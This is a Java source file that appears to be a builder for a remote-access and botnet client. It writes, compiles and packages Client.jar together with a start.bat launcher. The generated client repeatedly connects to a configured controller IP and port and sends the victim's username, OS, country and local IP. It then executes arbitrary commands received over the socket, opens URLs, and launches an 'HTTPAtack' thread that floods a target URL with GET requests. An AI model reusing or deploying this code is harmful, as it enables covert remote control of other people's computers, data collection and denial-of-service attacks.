package br.com.pricher.server;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

/**
 * Created by Jeferson Machado on 07/08/2017.
 */
public class MakeClient {
    final String ABSOLUT_PATH = new File(".").getCanonicalPath();
    String ip = "localhost";
    String port = "8694";

    public MakeClient(String ip, String port) throws IOException {
        this.ip = ip;
        this.port = port;

        String clientString = "import java.io.*;\n" +
                "import java.net.*;\n" +
                "\n" +
                "public class Client {\n" +
                "\n" +
                "    private Socket socket;\n" +
                "    private OutputStream ou;\n" +
                "    private Writer ouw;\n" +
                "    private BufferedWriter bfw;\n" +
                "\n" +
                "    public static void main(String[] args) throws IOException {\n" +
                "        Client app = new Client();\n" +
                "        app.connect();\n" +
                "        app.execute();\n" +
                "    }\n" +
                "\n" +
                "    private void connect() throws IOException {\n" +
                "        do {\n" +
                "            try {\n" +
                "                socket = new Socket(\"" + ip + "\"," + port + ");\n" +
                "                ou = socket.getOutputStream();\n" +
                "\n" +
                "                ouw = new OutputStreamWriter(ou);\n" +
                "                bfw = new BufferedWriter(ouw);\n" +
                "\n" +
                "            } catch (Exception e) {\n" +
                "                System.err.println(e);\n" +
                "            }\n" +
                "\n" +
                "        } while (socket == null);\n" +
                "        System.out.println(\"Conectado...\");\n" +
                "        //Nome de usuario no pc\n" +
                "        String osUser = System.getProperty(\"user.name\");\n" +
                "        //Sistema Operacional\n" +
                "        String osName = System.getProperty(\"os.name\");\n" +
                "        //Pais de origem\n" +
                "        String osCountry = System.getProperty(\"user.country\");\n" +
                "\n" +
                "        InetAddress ipAddress = InetAddress.getLocalHost();\n" +
                "        //Ip local da máquina\n" +
                "        String ipUser = ipAddress.getHostAddress();\n" +
                "\n" +
                "\n" +
                "        bfw.write(\"[\" + osCountry + \"]\" + osUser + \" - \" + osName + \" - [\" + ipUser + \"]\\r\\n+\");\n" +
                "        //enviarMensagem(\"Computer IP: \" + ipAddress.getHostAddress() + \" Connected\");\n" +
                "        bfw.flush();\n" +
                "    }\n" +
                "\n" +
                "\n" +
                "    /***\n" +
                "     * Método usado para enviar mensagem para o server socket\n" +
                "     * @param msg do tipo String\n" +
                "     * @throws IOException retorna IO Exception caso dê algum erro.\n" +
                "     */\n" +
                "    private void sendMessage(String msg) throws IOException {\n" +
                "        bfw.write(msg + \"\\r\\n\");\n" +
                "        bfw.flush();\n" +
                "    }\n" +
                "\n" +
                "    /**\n" +
                "     * Método usado para receber mensagem do servidor\n" +
                "     *\n" +
                "     * @throws IOException retorna IO Exception caso dê algum erro.\n" +
                "     */\n" +
                "    private void execute() throws IOException {\n" +
                "\n" +
                "        InputStream in = socket.getInputStream();\n" +
                "        InputStreamReader inr = new InputStreamReader(in);\n" +
                "        BufferedReader bfr = new BufferedReader(inr);\n" +
                "        String msg = \"\";\n" +
                "\n" +
                "        while (!\"Exit\".equalsIgnoreCase(msg))\n" +
                "            if (bfr.ready()) {\n" +
                "                msg = bfr.readLine();\n" +
                "                String[] msgFormatted = msg.split(\"&\");\n" +
                "\n" +
                "                switch (Integer.parseInt(msgFormatted[0])) {\n" +
                "                    case 0:\n" +
                "                        Runtime.getRuntime().exec(msgFormatted[1]);\n" +
                "                        sendMessage(\"Computador programado para desligar!\");\n" +
                "                        break;\n" +
                "                    case 1:\n" +
                "                        try {\n" +
                "                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));\n" +
                "                            sendMessage(\"Site \" + msgFormatted[1] + \" aberto!\");\n" +
                "                        } catch (Exception e) {\n" +
                "                            e.printStackTrace();\n" +
                "                            sendMessage(e.getMessage());\n" +
                "                        }\n" +
                "                        break;\n" +
                "                    case 2:\n" +
                "                        Runtime.getRuntime().exec(msgFormatted[1]);\n" +
                "                        break;\n" +
                "                    case 66:\n" +
                "                        new HTTPAtack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();\n" +
                "                        break;\n" +
                "                    default:\n" +
                "                        sendMessage(\"Erro ao enviar o comando.\");\n" +
                "                        break;\n" +
                "\n" +
                "                }\n" +
                "            }\n" +
                "    }\n" +
                "\n" +
                "    /*\n" +
                "    private void exit() throws IOException {\n" +
                "        sendMessage(\"Exit\");\n" +
                "        bfw.close();\n" +
                "        ouw.close();\n" +
                "        ou.close();\n" +
                "        socket.close();\n" +
                "    }*/\n" +
                "}\n" +
                "\n" +
                "class HTTPAtack extends Thread {\n" +
                "\n" +
                "    // Intensidad\n" +
                "    private static final int LOW = 1;\n" +
                "    private static final int MEDIUM = 2;\n" +
                "    private static final int HIGH = 3;\n" +
                "\n" +
                "    // Numero de peticiones segun la intensidad\n" +
                "    private static final int REQUEST_LOW = 100;\n" +
                "    private static final int REQUEST_MEDIUM = 200;\n" +
                "    private static final int REQUEST_HIGH = 500;\n" +
                "\n" +
                "    // URL a a atacar\n" +
                "    private URL url;\n" +
                "    // Intensidad del ataque\n" +
                "    private int intensity;\n" +
                "\n" +
                "    // Iniciamos la clase\n" +
                "    HTTPAtack(String url, int intensity) {\n" +
                "        try {\n" +
                "            this.url = new URL(url);\n" +
                "            this.intensity = intensity;\n" +
                "        } catch (Exception e) {\n" +
                "            System.out.println(e);\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    /*\n" +
                "   * Devuelve el numero de peticiones en funcion de la intensidad\n" +
                "   */\n" +
                "    private static int getNumRequest(int intensity) {\n" +
                "        switch (intensity) {\n" +
                "            case LOW:\n" +
                "                return REQUEST_LOW;\n" +
                "            case MEDIUM:\n" +
                "                return REQUEST_MEDIUM;\n" +
                "            default:\n" +
                "                return REQUEST_HIGH;\n" +
                "        }\n" +
                "    }\n" +
                "\n" +
                "    // Comienza el hilo. Este realiza 100 peticiones HTTP y va mostrando el\n" +
                "    // tiempo de respuesta de cada peticion\n" +
                "    public void run() {\n" +
                "        int i = 0;\n" +
                "        int request = getNumRequest(this.intensity);\n" +
                "        // Comenzamos las peticiones\n" +
                "        while (i < request) {\n" +
                "            try {\n" +
                "                // Realizamos la conexion\n" +
                "                HttpURLConnection conn = (HttpURLConnection) this.url.openConnection();\n" +
                "                conn.setAllowUserInteraction(true);\n" +
                "                conn.setConnectTimeout(5000); // 15 sec. connection timeout\n" +
                "                conn.setDoInput(true);\n" +
                "                conn.setDoOutput(false);\n" +
                "                conn.setUseCaches(false);\n" +
                "                conn.setRequestMethod(\"GET\");\n" +
                "                conn.setRequestProperty(\"Content-type\", \"text/html; charset=\" + \"UTF-8\");\n" +
                "\n" +
                "                conn.connect();\n" +
                "                conn.getResponseCode();\n" +
                "            } catch (Exception e) {\n" +
                "                System.out.println(e);\n" +
                "            }\n" +
                "            i++;\n" +
                "        }\n" +
                "    }\n" +
                "}";

        gravarEmArquivoTXT(clientString);
        compilarJava(ABSOLUT_PATH + "\\Client\\Client.java");
        gerarPacote();
    }

    private void gravarEmArquivoTXT(String clientString) {

        BufferedWriter fr = null;//Abre arquivo para escrita
        try {
            File file = new File(ABSOLUT_PATH + "/Client/");
            file.mkdir();
            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH + "/Client/Client.java", true));
            fr.write(clientString);//escreve a matricula do aluno no arquivo
            fr.newLine();//passa para a proxima linha
            fr.flush();
            fr.close();

            File file2 = new File(ABSOLUT_PATH+"/Client/META-INF/");
            file2.mkdir();
            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH+"/Client/META-INF/MANIFEST.MF", true));
            fr.write("Manifest-Version: 1.0\r\n");//escreve a matricula do aluno no arquivo
            fr.write("Main-Class: Client");
            fr.newLine();//passa para a proxima linha
            fr.flush();
            fr.close();

            String startBat = "java -jar Client.jar";
            fr = new BufferedWriter(new FileWriter(ABSOLUT_PATH+"/Client/start.bat", true));
            fr.write(startBat);//escreve a matricula do aluno no arquivo
            fr.newLine();//passa para a proxima linha
            fr.flush();
            fr.close();

        } catch (IOException e) {
            e.printStackTrace();
        }


    }

    private void compilarJava(String path) throws IOException {
        Runtime.getRuntime().exec("javac \""+ ABSOLUT_PATH+"\\Client\\Client.java\"");
    }

    private void gerarPacote() {
        try {
            //Runtime.getRuntime().exec("jar -cvfm Client.jar META-INF\\manifest.mf *.class");
            //Runtime.getRuntime().exec("jar -cvfm \""+ABSOLUT_PATH+"\\Client\\Client.jar\" \"" + ABSOLUT_PATH +"\\Client\\META-INF\\manifest.mf\" \""+ABSOLUT_PATH+"\\Client\\Client.class \" \""+ABSOLUT_PATH+"\\Client\\HTTPAtack.class\"");
            Runtime.getRuntime().exec("jar -cvfm \""+ABSOLUT_PATH+"\\Client\\Client.jar\" \"" + ABSOLUT_PATH +"\\Client\\META-INF\\manifest.mf\" *.class");
        } catch (IOException e) {
            System.out.println(e);
        }
    }

}
